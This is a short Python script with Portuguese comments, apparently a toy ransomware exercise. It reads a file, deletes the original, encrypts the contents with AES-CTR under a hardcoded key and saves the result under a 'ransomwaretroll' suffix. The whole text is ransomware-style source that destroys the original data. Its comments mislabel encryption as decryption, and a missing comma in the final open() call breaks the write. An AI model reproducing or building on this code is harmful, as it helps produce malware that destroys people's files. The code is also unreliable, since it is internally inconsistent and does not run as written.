import os
import pyaes

# abrir o arquivo criptografado.
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

#remover o arquivo criptogradado
os.remove(file_name)

#chave para descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criar o arquivo descriptografado
crypto_data = aes.encrypt(file_data)

# salvar o arquivo ccriptografado
new_file = file_name + "ransomwaretroll"
new_file = open(f'{new_file}' "wb")
new_file.write(crypto_data)
new_file.close()